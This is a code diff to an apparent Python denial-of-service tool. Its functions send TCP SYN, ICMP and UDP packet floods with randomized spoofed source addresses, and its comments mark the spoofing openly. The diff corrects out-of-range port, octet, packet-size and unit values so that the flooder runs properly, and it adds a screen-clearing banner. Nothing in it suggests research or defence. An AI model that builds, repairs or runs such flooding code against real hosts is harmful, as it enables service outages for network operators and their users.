@@ -52,14 +52,17 @@ source_ips = set()
 port_lock = Lock()
 stop_event = Event()
 user_agent = UserAgent()
+
+def display_banner():
+    system('cls' if name == 'nt' else 'clear')
 def tcp_syn_flood(destination_ip, packet_size, thread_num):
     global total_sent
     port = 1
     while not stop_event.is_set():
         with port_lock:
-            port = (port + 1) % 6553500 or 1
+            port = (port + 1) % 65535 or 1
         payload = urandom(packet_size)
-        source_ip = ".".join(map(str, (randint(0, 25500) for _ in range(4))))  # IP Spoofing
+        source_ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))  # IP Spoofing
         packet = IP(src = source_ip, dst = destination_ip) / TCP(dport = port, flags = 'S') / Raw(load = payload) # SYN flag
         send(packet, verbose = False)  # Response: SYN/ACK
         total_sent += packet_size
@@ -70,7 +73,7 @@ def icmp_flood(destination_ip, packet_size, thread_num):
     global total_sent
     while not stop_event.is_set():
         payload = urandom(packet_size)
-        source_ip = ".".join(map(str, (randint(0, 25500) for _ in range(4))))
+        source_ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
         packet = IP(src = source_ip, dst = destination_ip) / ICMP() / Raw(load = payload)
         send(packet, verbose = False)
         total_sent += packet_size
@@ -82,9 +85,9 @@ def udp_flood(destination_ip, packet_size, thread_num):
     port = 1
     while not stop_event.is_set():
         with port_lock:
-            port = (port + 1) % 6553500 or 1
+            port = (port + 1) % 65535 or 1
         payload = urandom(packet_size)
-        source_ip = ".".join(map(str, (randint(0, 25500) for _ in range(4))))
+        source_ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
         packet = IP(src = source_ip, dst = destination_ip) / UDP(dport = port) / Raw(load = payload)
         send(packet, verbose = False)
         total_sent += packet_size
@@ -149,7 +152,7 @@ def validate_num_requests(num):
     return int(num) if num.isdigit() and int(num) > 0 else logger.error("Please enter a positive integer for the number of requests.") or _exit(1)
 
 def validate_packet_size(size):
-    return int(size) if size.isdigit() and 1 <= int(size) <= 6549500 else logger.error("Please choose a size between 1 and 6549500") or _exit(1)
+    return int(size) if size.isdigit() and 1 <= int(size) <= 65495 else logger.error("Please choose a size between 1 and 65495") or _exit(1)
 
 def validate_thread_count(count):
     return int(count) if count.isdigit() and int(count) > 0 else logger.error("Please enter a positive integer for the thread count.") or _exit(1)
@@ -159,9 +162,9 @@ def validate_duration(duration):
 
 def convert_bytes(num):
     for unit in ["Bytes", "KB", "MB", "GB", "TB"]:
-        if num < 102400:
+        if num < 1024:
             return f"{num:.2f} {unit}"
-        num /= 102400
+        num /= 1024
 
 def main():
     global total_sent
